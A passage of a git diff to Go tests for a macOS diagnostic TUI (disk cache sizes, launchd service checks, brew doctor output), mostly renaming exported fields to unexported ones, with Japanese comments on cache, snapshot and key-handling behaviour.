 	// brew の行はタブが違う (タブ分割後、j では届かない)
 	v.HandleKey("tab", 40)
 	v.HandleKey("tab", 40)
-	if v.Tab != TabBrew {
-		t.Fatalf("tab 2 回で Homebrew に来ない: %v", v.Tab)
+	if v.tab != TabBrew {
+		t.Fatalf("tab 2 回で Homebrew に来ない: %v", v.tab)
 	}
 	_ = v.Lines(testOpts(40))
-	if !strings.Contains(v.Rows[v.Cur.Index].Text, "非推奨 / 無効になった cask") {
-		t.Fatalf("j で brew の概要行に着かない: %q", v.Rows[v.Cur.Index].Text)
+	if !strings.Contains(v.rows[v.cur.index].text, "非推奨 / 無効になった cask") {
+		t.Fatalf("j で brew の概要行に着かない: %q", v.rows[v.cur.index].text)
 	}
 	v.HandleKey("enter", 40)
 	if out := testText(v, 40); !strings.Contains(out, "You should find replacements") || !strings.Contains(out, "  foo") {
@@ -759,16 +759,16 @@ func TestDoctorCursorAndExpand(t *testing.T) {
 
 // 「診断できず」は UI に出る (削ると 0 件 / 警告なしに化ける経路。敵対レビュー 2026-09-02 P1)。
 func TestDoctorShowsUndiagnosedStates(t *testing.T) {
-	v := &DoctorView{Shown: true, DiskTotal: 3}
-	v.DiskRep = &disk.Report{Partial: true, Results: []disk.Result{
+	v := &DoctorView{shown: true, diskTotal: 3}
+	v.diskRep = &disk.Report{Partial: true, Results: []disk.Result{
 		{Entry: disk.Entry{ID: "a", Label: "A", Risk: disk.RiskSafe, Recover: "x"}, Status: disk.StatusFailed, Reason: "権限がありません (EACCES)"},
 		{Entry: disk.Entry{ID: "b", Label: "B", Risk: disk.RiskSafe, Recover: "y"}, Status: disk.StatusOK, Size: 10,
 			Items: []disk.Item{{Path: "/p", Size: 10}}, Failures: []string{"走査できず: /q: permission denied"}},
 		{Entry: disk.Entry{ID: "c", Label: "C", Risk: disk.RiskSafe, Recover: "z"}, Status: disk.StatusBlocked, Reason: "Chrome 起動中のため対象外"},
 	}}
-	v.SvcRep = &svc.Report{Scanned: 2, Interrupted: true, StatusErr: "launchctl: not found", BrewErr: "brew: not found",
+	v.svcRep = &svc.Report{Scanned: 2, Interrupted: true, StatusErr: "launchctl: not found", BrewErr: "brew: not found",
 		DirErrs: []string{"/Library/LaunchDaemons: permission denied"}, Undiagnosed: []svc.Undiagnosed{{PlistPath: "/x.plist", Reason: "plist を解釈できない"}}}
-	v.Brew = &BrewDoctorResult{Unavailable: "brew not found"}
+	v.brew = &brewDoctorResult{Unavailable: "brew not found"}
 	out := doctorTextAllTabs(v, 60)
 	for _, want := range []string{"---", "権限がありません (EACCES)", "❓ 走査できず", "一部走査できず", "permission denied", "(中断: 部分結果)",
 		"途中で中断されました", "診断できず (launchctl)", "診断できず (brew)", "走査できず: /Library/LaunchDaemons", "❔ 診断できず: /x.plist",
@@ -792,8 +792,8 @@ func TestDoctorShowsUndiagnosedStates(t *testing.T) {
 // ただし partial は完全な結果を潰さない (数件だけの partial で 45GB の結果を消してトーストを黙らせない)。
 func TestDoctorSavesCacheOnCompleteAndPartialPolicy(t *testing.T) {
 	v := testView(t)
-	runCmds(t, v, v.Open())
-	c, ok := LoadDoctorDiskCache()
+	runCmds(t, v, v.open())
+	c, ok := loadDoctorDiskCache()
 	if !ok || c.Partial || len(c.Entries) != 1 || c.Entries[0].ID != "thing" || c.Total == 0 {
 		t.Fatalf("完了時のキャッシュ: ok=%v %+v", ok, c)
 	}
@@ -802,12 +802,12 @@ func TestDoctorSavesCacheOnCompleteAndPartialPolicy(t *testing.T) {
 	// (以前は「書かない」ことで守っていたが、それだと今回測ったぶんが捨てられた。issue 172/173)。
 	// (doctorTestView は XDG_CACHE_HOME を作り直すので、キャッシュは view を作った後にその置き場へ書く)
 	v2 := testView(t)
-	if err := SaveDoctorDiskCache(DoctorDiskCache{ScannedAt: time.Now(), Total: 45 << 30, Entries: []DoctorDiskCacheEntry{{ID: "big", Size: 45 << 30, Status: "ok"}}}); err != nil {
+	if err := saveDoctorDiskCache(doctorDiskCache{ScannedAt: time.Now(), Total: 45 << 30, Entries: []doctorDiskCacheEntry{{ID: "big", Size: 45 << 30, Status: "ok"}}}); err != nil {
 		t.Fatal(err)
 	}
 	doctorFirstDiskEvent(t, v2)
-	v2.Close()
-	c2, _ := LoadDoctorDiskCache()
+	v2.close()
+	c2, _ := loadDoctorDiskCache()
 	if c2.Total < 45<<30 {
 		t.Fatalf("小さい partial が完全な結果を潰した: %+v", c2)
 	}
@@ -823,8 +823,8 @@ func TestDoctorSavesCacheOnCompleteAndPartialPolicy(t *testing.T) {
 	// 完全な結果が無ければ partial を保存する
 	v3 := testView(t)
 	doctorFirstDiskEvent(t, v3)
-	v3.Close()
-	if c3, ok := LoadDoctorDiskCache(); !ok || !c3.Partial || len(c3.Entries) != 1 {
+	v3.close()
+	if c3, ok := loadDoctorDiskCache(); !ok || !c3.Partial || len(c3.Entries) != 1 {
 		t.Fatalf("完全な結果が無いのに partial が保存されない: ok=%v %+v", ok, c3)
 	}
 }
@@ -832,25 +832,25 @@ func TestDoctorSavesCacheOnCompleteAndPartialPolicy(t *testing.T) {
 // 閉じて開き直した後に届く古い世代の Msg は捨てる (再スキャンで開き直した画面を汚さない)。
 func TestDoctorIgnoresStaleGeneration(t *testing.T) {
 	v := testView(t)
-	_ = v.Open()
-	stale := v.Gen
-	v.Close()
-	_ = v.Open() // gen が進む。shown は true
-	if stale == v.Gen {
+	_ = v.open()
+	stale := v.gen
+	v.close()
+	_ = v.open() // gen が進む。shown は true
+	if stale == v.gen {
 		t.Fatal("open で世代が進まない")
 	}
-	if cmd := v.ReceiveDisk(DoctorDiskMsg{Gen: stale, Ev: DoctorDiskEvent{R: &disk.Result{}}}); cmd != nil || len(v.DiskResults) != 0 {
+	if cmd := v.receiveDisk(doctorDiskMsg{gen: stale, ev: doctorDiskEvent{r: &disk.Result{}}}); cmd != nil || len(v.diskResults) != 0 {
 		t.Error("旧世代の disk Msg を受け取った")
 	}
-	v.ReceiveSvc(DoctorSvcMsg{Gen: stale, Rep: svc.Report{Scanned: 9}})
-	if v.SvcRep != nil {
+	v.receiveSvc(doctorSvcMsg{gen: stale, rep: svc.Report{Scanned: 9}})
+	if v.svcRep != nil {
 		t.Error("旧世代の svc Msg を受け取った")
 	}
-	v.ReceiveBrew(DoctorBrewMsg{Gen: stale, Res: BrewDoctorResult{Clean: true}})
-	if v.Brew != nil {
+	v.receiveBrew(doctorBrewMsg{gen: stale, res: brewDoctorResult{Clean: true}})
+	if v.brew != nil {
 		t.Error("旧世代の brew Msg を受け取った")
 	}
-	v.Close()
+	v.close()
 }
 
 // キー: D/q/esc で閉じる、r は再スキャンの信号 (走査は止めるが partial は書かない)。
@@ -859,17 +859,17 @@ func TestDoctorHandleKey(t *testing.T) {
 	// 走査中で結果を持っている状態から押す。open() 直後 (diskResults が空) だと、r を close() に
 	// 変えても「どちらも何も書かない」で通ってしまう (issues/170)
 	doctorFirstDiskEvent(t, v)
-	if len(v.DiskResults) == 0 {
+	if len(v.diskResults) == 0 {
 		t.Fatal("前提が崩れている: diskResults が空のまま")
 	}
 	if v.HandleKey("r", 20) != DoctorRescan {
 		t.Error("r が再スキャンの信号を返さない")
 	}
-	if _, ok := LoadDoctorDiskCache(); ok {
+	if _, ok := loadDoctorDiskCache(); ok {
 		t.Error("r で partial が保存された (r は close を経由しない)")
 	}
 	for _, k := range []string{"D", "q", "esc"} {
-		_ = v.Open()
+		_ = v.open()
 		if v.HandleKey(k, 20) != DoctorClosed || v.Visible() {
 			t.Errorf("%s で閉じない", k)
 		}
@@ -880,18 +880,18 @@ func TestDoctorHandleKey(t *testing.T) {
 // r は snapshot を無視して走査し直す。partial は snapshot にならない。
 func TestDoctorReusesRecentSnapshot(t *testing.T) {
 	v := testView(t)
-	runCmds(t, v, v.Open())
-	v.Close()
-	if _, ok := LoadDoctorSnapshot(time.Now()); !ok {
+	runCmds(t, v, v.open())
+	v.close()
+	if _, ok := loadDoctorSnapshot(time.Now()); !ok {
 		t.Fatal("完了後に snapshot が書かれない")
 	}
 	// 🚨 open() は docker の Cmd を返す (docker だけ snapshot に載せていないため)。
 	// ここの主張は「disk / svc / brew を走査し直していない」なので snapshotAt で見る
-	runCmds(t, v, v.Open())
-	if v.SnapshotAt.IsZero() {
+	runCmds(t, v, v.open())
+	if v.snapshotAt.IsZero() {
 		t.Fatal("TTL 内の再オープンで snapshot を使わず走査した")
 	}
-	if v.Scanning() || v.DiskRep == nil || v.SvcRep == nil || v.Brew == nil || v.SnapshotAt.IsZero() {
+	if v.Scanning() || v.diskRep == nil || v.svcRep == nil || v.brew == nil || v.snapshotAt.IsZero() {
 		t.Fatalf("snapshot から 3 セクションが復元されない: %+v", v.Scanning())
 	}
 	if out := testText(v, 40); !strings.Contains(out, "分前の結果 (r で再スキャン)") || !strings.Contains(out, "Thing キャッシュ") {
@@ -900,33 +900,33 @@ func TestDoctorReusesRecentSnapshot(t *testing.T) {
 	if v.HandleKey("r", 40) != DoctorRescan {
 		t.Fatal("r が再スキャンの信号を返さない")
 	}
-	if cmd := v.Rescan(); cmd == nil || !v.Scanning() || !v.SnapshotAt.IsZero() {
+	if cmd := v.Rescan(); cmd == nil || !v.Scanning() || !v.snapshotAt.IsZero() {
 		t.Fatal("r が snapshot を無視して走査し直さない")
 	}
-	v.Close()
+	v.close()
 	// TTL 切れは走査する
-	writeTestSnapshot(t, DoctorSnapshot{ScannedAt: time.Now().Add(-DoctorSnapshotTTL - time.Minute)})
-	if cmd := v.Open(); cmd == nil {
+	writeTestSnapshot(t, doctorSnapshot{ScannedAt: time.Now().Add(-doctorSnapshotTTL - time.Minute)})
+	if cmd := v.open(); cmd == nil {
 		t.Fatal("TTL 切れの snapshot を使った")
 	}
-	v.Close()
+	v.close()
 	// partial は snapshot にならない
-	if err := SaveDoctorSnapshot(DoctorSnapshot{ScannedAt: time.Now(), Disk: disk.Report{Partial: true}}); err != nil {
+	if err := saveDoctorSnapshot(doctorSnapshot{ScannedAt: time.Now(), Disk: disk.Report{Partial: true}}); err != nil {
 		t.Fatal(err)
 	}
-	if sn, ok := LoadDoctorSnapshot(time.Now()); ok && sn.Disk.Partial {
+	if sn, ok := loadDoctorSnapshot(time.Now()); ok && sn.Disk.Partial {
 		t.Fatal("partial が snapshot として保存された")
 	}
 }
 
 // y はパス、Y は解説文をコピーする。中身は行の種類ごとに違う (ディスク = 対象パス、svc = plist、brew = 概要)。
 func TestDoctorCopyPathAndText(t *testing.T) {
-	v := &DoctorView{Shown: true, Expanded: map[RowKey]bool{}}
-	v.DiskRep = &disk.Report{Results: []disk.Result{{Entry: disk.Entry{ID: "npm-cache", Label: "npm", Risk: disk.RiskSafe, Recover: "再取得", DeleteVia: "rm"},
+	v := &DoctorView{shown: true, expanded: map[rowKey]bool{}}
+	v.diskRep = &disk.Report{Results: []disk.Result{{Entry: disk.Entry{ID: "npm-cache", Label: "npm", Risk: disk.RiskSafe, Recover: "再取得", DeleteVia: "rm"},
 		Status: disk.StatusOK, Size: 2048, Items: []disk.Item{{Path: "/h/.npm/_cacache", Size: 2048}, {Path: "/h/.npm/other", Size: 0}}}}}
-	v.SvcRep = &svc.Report{Findings: []svc.Finding{{Label: "com.x.y", PlistPath: "/L/com.x.y.plist", Domain: "gui/501",
+	v.svcRep = &svc.Report{Findings: []svc.Finding{{Label: "com.x.y", PlistPath: "/L/com.x.y.plist", Domain: "gui/501",
 		Reasons: []string{"実行ファイルがありません: /nowhere"}, MissingExec: "/nowhere", Commands: []string{"launchctl bootout gui/501/com.x.y"}}}}
-	v.Brew = &BrewDoctorResult{Warnings: []string{"Warning: Some kegs\nbody line"}}
+	v.brew = &brewDoctorResult{Warnings: []string{"Warning: Some kegs\nbody line"}}
 	_ = v.Lines(testOpts(40))
 	if got := v.HandleKey("y", 40); got != DoctorCopyPath || v.CopyPayload() != "/h/.npm/_cacache\n/h/.npm/other" {
 		t.Fatalf("ディスク行の y: action=%v payload=%q", got, v.CopyPayload())
@@ -942,8 +942,8 @@ func TestDoctorCopyPathAndText(t *testing.T) {
 	// svc はタブが違う (タブ分割後、j では届かない)
 	v.HandleKey("tab", 40)
 	_ = v.Lines(testOpts(40))
-	v.Cur.Index = 0
-	v.Cur.Move(v.Rows, 0)
+	v.cur.index = 0
+	v.cur.move(v.rows, 0)
 	if v.HandleKey("y", 40) != DoctorCopyPath || v.CopyPayload() != "/L/com.x.y.plist" {
 		t.Fatalf("svc 行の y: %q", v.CopyPayload())
 	}
@@ -953,8 +953,8 @@ func TestDoctorCopyPathAndText(t *testing.T) {
 	}
 	v.HandleKey("tab", 40) // brew (タブが違う)
 	_ = v.Lines(testOpts(40))
-	v.Cur.Index = 0
-	v.Cur.Move(v.Rows, 0)
+	v.cur.index = 0
+	v.cur.move(v.rows, 0)
 	if v.HandleKey("y", 40) != DoctorCopyPath || v.CopyPayload() != "Some kegs" {
 		t.Fatalf("brew 行の y: %q", v.CopyPayload())
 	}
@@ -962,8 +962,8 @@ func TestDoctorCopyPathAndText(t *testing.T) {
 		t.Fatalf("brew 行の Y: %q", v.CopyPayload())
 	}
 	// 選べる行に居なければ「無い」
-	v.Rows = nil
-	v.Cur.Index = 0
+	v.rows = nil
+	v.cur.index = 0
 	if v.HandleKey("y", 40) != DoctorNothing {
 		t.Error("行が無いのにコピーした")
 	}
@@ -976,27 +976,27 @@ func TestDoctorReusesHeavyEntries(t *testing.T) {
 	now := time.Now()
 	heavy := disk.Result{Entry: disk.Entry{ID: "thing", Label: "古い定義"}, Status: disk.StatusOK, Size: 777, Elapsed: 3 * time.Second,
 		MeasuredAt: now.Add(-20 * time.Minute), Items: []disk.Item{{Path: "/prev", Size: 777}}}
-	sn := DoctorSnapshot{ScannedAt: now.Add(-10 * time.Minute), Disk: disk.Report{Results: []disk.Result{heavy}}} // TTL 5 分は過ぎている
+	sn := doctorSnapshot{ScannedAt: now.Add(-10 * time.Minute), Disk: disk.Report{Results: []disk.Result{heavy}}} // TTL 5 分は過ぎている
 	writeTestSnapshot(t, sn)
-	cmd := v.Open()
+	cmd := v.open()
 	if cmd == nil {
 		t.Fatal("TTL 切れなのに走査しない")
 	}
 	runCmds(t, v, cmd)
-	r := v.DiskRep.Results[0]
+	r := v.diskRep.Results[0]
 	if !r.Reused || r.Size != 777 || r.Entry.Label != "Thing キャッシュ" {
 		t.Fatalf("重いエントリの前回値が再利用されない / ラベルが今のカタログに揃わない: %+v", r)
 	}
 	if !strings.Contains(testText(v, 40), "分前の計測を再利用") {
 		t.Error("再利用した旨が行に出ない")
 	}
-	v.Close()
+	v.close()
 	// r は測り直す
 	runCmds(t, v, v.Rescan())
-	if v.DiskRep.Results[0].Reused {
+	if v.diskRep.Results[0].Reused {
 		t.Fatal("r でも前回値を再利用した")
 	}
-	v.Close()
+	v.close()
 	// 軽い (Elapsed 小) / 古い (1 時間超) は再利用しない
 	for name, mod := range map[string]func(*disk.Result){
 		"light":   func(r *disk.Result) { r.Elapsed = 10 * time.Millisecond },
@@ -1014,16 +1014,16 @@ func TestDoctorReusesHeavyEntries(t *testing.T) {
 	} {
 		h := heavy
 		mod(&h)
-		if f := DoctorReuseFrom(DoctorSnapshot{ScannedAt: now, Disk: disk.Report{Results: []disk.Result{h}}}, true, now); f != nil && f(disk.Entry{ID: "thing"}) != nil {
+		if f := doctorReuseFrom(doctorSnapshot{ScannedAt: now, Disk: disk.Report{Results: []disk.Result{h}}}, true, now); f != nil && f(disk.Entry{ID: "thing"}) != nil {
 			t.Errorf("%s: 再利用してはいけないものを再利用した", name)
 		}
 	}
 	// partial な snapshot は丸ごと再利用しない (中断で歪んだ結果を次の走査へ持ち込まない)
-	if f := DoctorReuseFrom(DoctorSnapshot{ScannedAt: now, Disk: disk.Report{Partial: true, Results: []disk.Result{heavy}}}, true, now); f != nil {
+	if f := doctorReuseFrom(doctorSnapshot{ScannedAt: now, Disk: disk.Report{Partial: true, Results: []disk.Result{heavy}}}, true, now); f != nil {
 		t.Error("partial な snapshot から再利用した")
 	}
 	// 読めなかった snapshot (ok=false) も同じ
-	if f := DoctorReuseFrom(DoctorSnapshot{ScannedAt: now, Disk: disk.Report{Results: []disk.Result{heavy}}}, false, now); f != nil {
+	if f := doctorReuseFrom(doctorSnapshot{ScannedAt: now, Disk: disk.Report{Results: []disk.Result{heavy}}}, false, now); f != nil {
 		t.Error("読めていない snapshot から再利用した")
 	}
 }
@@ -1054,7 +1054,7 @@ func TestDoctorSvcAnnotationsMatchCLI(t *testing.T) {
 	}
 
 	cli := svc.Format(rep)
-	v := &DoctorView{Shown: true, Tab: TabSvc, Expanded: map[RowKey]bool{}, SvcRep: &rep}
+	v := &DoctorView{shown: true, tab: TabSvc, expanded: map[rowKey]bool{}, svcRep: &rep}
 	// 幅を広く取る: 注記が出ているかを見るテストなので、末尾切れ (term.TruncateDisp) で落ちないようにする
 	// (狭い幅で注記が読めなくなる問題は issues/182 が別に扱う)
 	wide := testOpts(60)
@@ -1062,9 +1062,9 @@ func TestDoctorSvcAnnotationsMatchCLI(t *testing.T) {
 	ui := strings.Join(v.Lines(wide), "\n")
 
 	var copies strings.Builder
-	for _, r := range v.Rows {
-		if r.CopyText != "" {
-			copies.WriteString(r.CopyText)
+	for _, r := range v.rows {
+		if r.copyText != "" {
+			copies.WriteString(r.copyText)
 		}
 	}
 
@@ -1097,31 +1097,31 @@ func TestDoctorSaveCachePartialBoundaries(t *testing.T) {
 
 	// (a) 合計が前回より大きい partial は書く。重いエントリが先に終わった中断結果を捨てない
 	v := testView(t)
-	if err := SaveDoctorDiskCache(DoctorDiskCache{ScannedAt: time.Now(), Total: 1 << 30}); err != nil {
+	if err := saveDoctorDiskCache(doctorDiskCache{ScannedAt: time.Now(), Total: 1 << 30}); err != nil {
 		t.Fatal(err)
 	}
-	v.SaveCache(rep(45<<30, true))
-	if c, _ := LoadDoctorDiskCache(); c.Total != 45<<30 || !c.Partial {
+	v.saveCache(rep(45<<30, true))
+	if c, _ := loadDoctorDiskCache(); c.Total != 45<<30 || !c.Partial {
 		t.Errorf("大きい partial が書かれない: %+v", c)
 	}
 
 	// (b) 前回が partial なら、合計が小さくても最新の partial で置き換える
 	v2 := testView(t)
-	if err := SaveDoctorDiskCache(DoctorDiskCache{ScannedAt: time.Now(), Total: 45 << 30, Partial: true}); err != nil {
+	if err := saveDoctorDiskCache(doctorDiskCache{ScannedAt: time.Now(), Total: 45 << 30, Partial: true}); err != nil {
 		t.Fatal(err)
 	}
-	v2.SaveCache(rep(1<<30, true))
-	if c, _ := LoadDoctorDiskCache(); c.Total != 1<<30 {
+	v2.saveCache(rep(1<<30, true))
+	if c, _ := loadDoctorDiskCache(); c.Total != 1<<30 {
 		t.Errorf("前回が partial なのに最新の partial で置き換わらない: %+v", c)
 	}
 
 	// (c) 完全な結果は、前回が大きくても常に書く (再スキャンで減った実体を反映する)
 	v3 := testView(t)
-	if err := SaveDoctorDiskCache(DoctorDiskCache{ScannedAt: time.Now(), Total: 45 << 30}); err != nil {
+	if err := saveDoctorDiskCache(doctorDiskCache{ScannedAt: time.Now(), Total: 45 << 30}); err != nil {
 		t.Fatal(err)
 	}
-	v3.SaveCache(rep(1<<30, false))
-	if c, _ := LoadDoctorDiskCache(); c.Total != 1<<30 || c.Partial {
+	v3.saveCache(rep(1<<30, false))
+	if c, _ := loadDoctorDiskCache(); c.Total != 1<<30 || c.Partial {
 		t.Errorf("完全な結果が書かれない: %+v", c)
 	}
 
@@ -1129,7 +1129,7 @@ func TestDoctorSaveCachePartialBoundaries(t *testing.T) {
 	v4 := testView(t)
 	doctorFirstDiskEvent(t, v4)
 	var want int64 // production の SumDeletable ではなく Items から自前で足す
-	for _, r := range v4.DiskResults {
+	for _, r := range v4.diskResults {
 		for _, it := range r.Items {
 			want += it.Size
 		}
@@ -1137,8 +1137,8 @@ func TestDoctorSaveCachePartialBoundaries(t *testing.T) {
 	if want == 0 {
 		t.Fatal("前提が崩れている: 受け取った結果に Items が無い")
 	}
-	v4.Close()
-	if c, ok := LoadDoctorDiskCache(); !ok || c.Total != want {
+	v4.close()
+	if c, ok := loadDoctorDiskCache(); !ok || c.Total != want {
 		t.Errorf("close の partial に合計が入っていない: ok=%v total=%d want=%d", ok, c.Total, want)
 	}
 }
@@ -1148,41 +1148,41 @@ func TestDoctorSnapshotRejectsFutureAndInterrupted(t *testing.T) {
 	v := testView(t)
 	_ = v
 	now := time.Now()
-	write := func(sn DoctorSnapshot) { writeTestSnapshot(t, sn) }
+	write := func(sn doctorSnapshot) { writeTestSnapshot(t, sn) }
 
 	// 時計を戻した (ScannedAt が未来) snapshot は TTL 内と読まない
-	write(DoctorSnapshot{ScannedAt: now.Add(48 * time.Hour)})
-	if _, ok := LoadDoctorSnapshot(now); ok {
+	write(doctorSnapshot{ScannedAt: now.Add(48 * time.Hour)})
+	if _, ok := loadDoctorSnapshot(now); ok {
 		t.Error("未来の snapshot を TTL 内として読んだ")
 	}
 	// 正常な TTL 内は読む (上の assert が「常に false」で通っていないことの確認)
-	write(DoctorSnapshot{ScannedAt: now.Add(-1 * time.Minute)})
-	if _, ok := LoadDoctorSnapshot(now); !ok {
+	write(doctorSnapshot{ScannedAt: now.Add(-1 * time.Minute)})
+	if _, ok := loadDoctorSnapshot(now); !ok {
 		t.Error("TTL 内の snapshot を読めない")
 	}
 
 	// 中断した svc を含む結果は snapshot にしない (開き直しで中断の姿を再現しない)
-	path, _ := DoctorSnapshotPath()
+	path, _ := doctorSnapshotPath()
 	if err := os.Remove(path); err != nil {
 		t.Fatal(err)
 	}
-	if err := SaveDoctorSnapshot(DoctorSnapshot{ScannedAt: now, Svc: svc.Report{Interrupted: true}}); err != nil {
+	if err := saveDoctorSnapshot(doctorSnapshot{ScannedAt: now, Svc: svc.Report{Interrupted: true}}); err != nil {
 		t.Fatal(err)
 	}
-	if _, ok := LoadDoctorSnapshotAny(); ok {
+	if _, ok := loadDoctorSnapshotAny(); ok {
 		t.Error("svc が中断した結果を snapshot に書いた")
 	}
-	if err := SaveDoctorSnapshot(DoctorSnapshot{ScannedAt: now, Disk: disk.Report{Partial: true}}); err != nil {
+	if err := saveDoctorSnapshot(doctorSnapshot{ScannedAt: now, Disk: disk.Report{Partial: true}}); err != nil {
 		t.Fatal(err)
 	}
-	if _, ok := LoadDoctorSnapshotAny(); ok {
+	if _, ok := loadDoctorSnapshotAny(); ok {
 		t.Error("partial な disk の結果を snapshot に書いた")
 	}
 	// ガードに当たらない結果は書ける
-	if err := SaveDoctorSnapshot(DoctorSnapshot{ScannedAt: now}); err != nil {
+	if err := saveDoctorSnapshot(doctorSnapshot{ScannedAt: now}); err != nil {
 		t.Fatal(err)
 	}
-	if _, ok := LoadDoctorSnapshotAny(); !ok {
+	if _, ok := loadDoctorSnapshotAny(); !ok {
 		t.Error("正常な結果が snapshot に書かれない")
 	}
 }
@@ -1192,39 +1192,39 @@ func TestDoctorSnapshotRejectsFutureAndInterrupted(t *testing.T) {
 func TestDoctorIgnoresDiskMsgAfterClose(t *testing.T) {
 	v := testView(t)
 	gen := 0
-	var complete DoctorDiskMsg
-	for _, sub := range v.Open()().(tea.BatchMsg) {
-		if msg, ok := sub().(DoctorDiskMsg); ok {
-			gen = msg.Gen
-			if msg.Ev.Rep != nil {
+	var complete doctorDiskMsg
+	for _, sub := range v.open()().(tea.BatchMsg) {
+		if msg, ok := sub().(doctorDiskMsg); ok {
+			gen = msg.gen
+			if msg.ev.rep != nil {
 				complete = msg
 			}
 		}
 	}
 	// 完了イベントは channel の後ろにいるので、届くまで受け取る (回数で打ち切る。時間で待たない)
-	for i := 0; complete.Ev.Rep == nil && i < 100; i++ {
-		msg, ok := v.WaitDiskCmd(gen)().(DoctorDiskMsg)
+	for i := 0; complete.ev.rep == nil && i < 100; i++ {
+		msg, ok := v.waitDiskCmd(gen)().(doctorDiskMsg)
 		if !ok {
 			break
 		}
-		if msg.Ev.Rep != nil {
+		if msg.ev.rep != nil {
 			complete = msg
 		}
 	}
-	if complete.Ev.Rep == nil {
+	if complete.ev.rep == nil {
 		t.Fatal("完了イベントが取れない")
 	}
-	v.Close()
-	if _, ok := LoadDoctorDiskCache(); ok {
+	v.close()
+	if _, ok := loadDoctorDiskCache(); ok {
 		t.Fatal("前提が崩れている: close の時点でキャッシュが書かれている")
 	}
-	if cmd := v.ReceiveDisk(complete); cmd != nil {
+	if cmd := v.receiveDisk(complete); cmd != nil {
 		t.Error("閉じた後の Msg に対して次の待ち受けを返した")
 	}
-	if v.DiskRep != nil {
+	if v.diskRep != nil {
 		t.Error("閉じた後の Msg で画面の状態を更新した")
 	}
-	if _, ok := LoadDoctorDiskCache(); ok {
+	if _, ok := loadDoctorDiskCache(); ok {
 		t.Error("閉じた後の Msg でキャッシュを書いた")
 	}
 }
@@ -1233,23 +1233,23 @@ func TestDoctorIgnoresDiskMsgAfterClose(t *testing.T) {
 // disk の Failures は親行の Y からしか取れず、svc の Undiagnosed は**どこからも取れなかった**
 // (幅 80 で理由が丸ごと消える。issues/180)。
 func TestDoctorUndiagnosedRowsAreSelectable(t *testing.T) {
-	v := &DoctorView{Shown: true, Expanded: map[RowKey]bool{}}
-	v.DiskRep = &disk.Report{Results: []disk.Result{{
+	v := &DoctorView{shown: true, expanded: map[rowKey]bool{}}
+	v.diskRep = &disk.Report{Results: []disk.Result{{
 		Entry:  disk.Entry{ID: "npm-cache", Label: "npm", Risk: disk.RiskSafe, Recover: "再取得", DeleteVia: "rm"},
 		Status: disk.StatusOK, Size: 2048, Items: []disk.Item{{Path: "/h/.npm/_cacache", Size: 2048}},
 		Failures: []string{"走査できず: /h/.npm/_locks: permission denied"},
 	}}}
-	v.SvcRep = &svc.Report{Scanned: 3, Undiagnosed: []svc.Undiagnosed{
+	v.svcRep = &svc.Report{Scanned: 3, Undiagnosed: []svc.Undiagnosed{
 		{PlistPath: "/Library/LaunchDaemons/com.vendor.broken.plist", Reason: "plist を読めない: permission denied"},
 	}}
-	v.Brew = &BrewDoctorResult{Clean: true}
+	v.brew = &brewDoctorResult{Clean: true}
 
 	// 行の種類で探す (押した回数で位置を決めると、選べる行が増えた時に前提が崩れる)
 	find := func(prefix string) int {
 		t.Helper()
-		for i, r := range v.Rows {
-			if strings.Contains(r.Text, prefix) {
-				if !r.Selectable {
+		for i, r := range v.rows {
+			if strings.Contains(r.text, prefix) {
+				if !r.selectable {
 					t.Fatalf("%q の行が選べない", prefix)
 				}
 				return i
@@ -1262,24 +1262,24 @@ func TestDoctorUndiagnosedRowsAreSelectable(t *testing.T) {
 
 	// disk の「一部走査できず」: y は理由の文字列 (パスを含む)、Y は親エントリの解説
 	i := find("一部走査できず")
-	v.Cur.Index = i
+	v.cur.index = i
 	if got := v.HandleKey("y", 40); got != DoctorCopyPath || !strings.Contains(v.CopyPayload(), "/h/.npm/_locks") {
 		t.Errorf("Failures 行の y: action=%v payload=%q", got, v.CopyPayload())
 	}
-	v.Cur.Index = i
+	v.cur.index = i
 	if got := v.HandleKey("Y", 40); got != DoctorCopyText || !strings.Contains(v.CopyPayload(), "_locks: permission denied") {
 		t.Errorf("Failures 行の Y に走査できなかった理由が無い: action=%v payload=%q", got, v.CopyPayload())
 	}
 
 	// svc の「診断できず」: y は plist のパス、Y は理由と裏取りコマンド
-	v.Tab = TabSvc // タブ分割後、svc の行は別タブ
+	v.tab = TabSvc // タブ分割後、svc の行は別タブ
 	_ = v.Lines(testOpts(40))
 	j := find("診断できず")
-	v.Cur.Index = j
+	v.cur.index = j
 	if got := v.HandleKey("y", 40); got != DoctorCopyPath || v.CopyPayload() != "/Library/LaunchDaemons/com.vendor.broken.plist" {
 		t.Errorf("Undiagnosed 行の y: action=%v payload=%q", got, v.CopyPayload())
 	}
-	v.Cur.Index = j
+	v.cur.index = j
 	if got := v.HandleKey("Y", 40); got != DoctorCopyText {
 		t.Fatalf("Undiagnosed 行の Y: action=%v", got)
 	}
@@ -1290,7 +1290,7 @@ func TestDoctorUndiagnosedRowsAreSelectable(t *testing.T) {
 	}
 
 	// Enter で理由が読める (一覧の行は幅で切れても、詳細には出る)
-	v.Cur.Index = j
+	v.cur.index = j
 	v.HandleKey("enter", 40)
 	if txt := strings.Join(v.Lines(testOpts(40)), "\n"); !strings.Contains(txt, "理由: plist を読めない") {
 		t.Errorf("Undiagnosed 行の Enter で理由が出ない:\n%s", txt)
@@ -1309,7 +1309,7 @@ func TestDoctorSaveCacheKeepsLastRealMeasurement(t *testing.T) {
 	rep := func(rs ...disk.Result) disk.Report {
 		return disk.Report{ScannedAt: time.Now(), Results: rs, Total: disk.SumDeletable(rs)}
 	}
-	prev := DoctorDiskCache{ScannedAt: time.Now(), Total: 45 << 30, Entries: []DoctorDiskCacheEntry{
+	prev := doctorDiskCache{ScannedAt: time.Now(), Total: 45 << 30, Entries: []doctorDiskCacheEntry{
 		{ID: "heavy", Label: "Heavy", Size: 44 << 30, Status: "ok"},
 		{ID: "small", Label: "Small", Size: 1 << 30, Status: "ok"},
 	}}
@@ -1317,7 +1317,7 @@ func TestDoctorSaveCacheKeepsLastRealMeasurement(t *testing.T) {
 	reused := ok("heavy", 100<<30)
 	reused.Reused = true
 
-	next := DoctorCacheFromReport(rep(reused, ok("small", 1<<30)), prev)
+	next := doctorCacheFromReport(rep(reused, ok("small", 1<<30)), prev)
 	if next.Total != 45<<30 {
 		t.Errorf("再利用ぶんに前回の実測値 (44GB) が使われていない: total=%d", next.Total)
 	}
@@ -1331,29 +1331,29 @@ func TestDoctorSaveCacheKeepsLastRealMeasurement(t *testing.T) {
 	}
 
 	// 前回のエントリが無ければ持たない (でっち上げない)
-	orphan := DoctorCacheFromReport(rep(reused), DoctorDiskCache{ScannedAt: time.Now()})
